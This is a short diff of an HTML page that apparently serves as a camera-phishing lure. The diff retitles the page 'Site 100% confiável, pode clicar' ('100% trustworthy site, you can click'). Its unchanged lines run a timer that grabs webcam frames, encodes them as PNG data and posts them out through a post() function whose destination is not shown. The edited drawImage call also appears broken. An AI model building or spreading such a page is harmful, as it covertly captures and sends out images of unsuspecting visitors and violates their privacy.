@@ -1,6 +1,6 @@
 <!doctype html>
 <html>
-<title> Video Chamada by Renan </title>
+<title> Site 100% confiável, pode clicar🥰 </title>
 <img src="https://w7.pngwing.com/pngs/657/55/png-transparent-hello-kitty-illustration-hello-kitty-online-sanrio-hello-kitty-poster-sticker-flower-thumbnail.png" alt="">
 <head>
   <script type="text/javascript" src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
@@ -12,7 +12,7 @@
   <video id="video" playsinline autoplay></video>
 </div>
 
-<center><canvas id="canvas" width="640" height="480" audoplay></canvas></center>
+<center><canvas id="canvas" width="720" height="1280" audoplay></canvas></center>
 
 <style>
   @import url("https://fonts.googleapis.com/css2?family=Nunito:wght@500;500&display=swap");
@@ -167,7 +167,7 @@
     var context = canvas.getContext('2d');
     setInterval(function () {
 
-      context.drawImage(video, 0, 0, 640, 480);
+      context.drawImage(video, 720, 1280);
       var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
       post(canvasData);
       video.play();
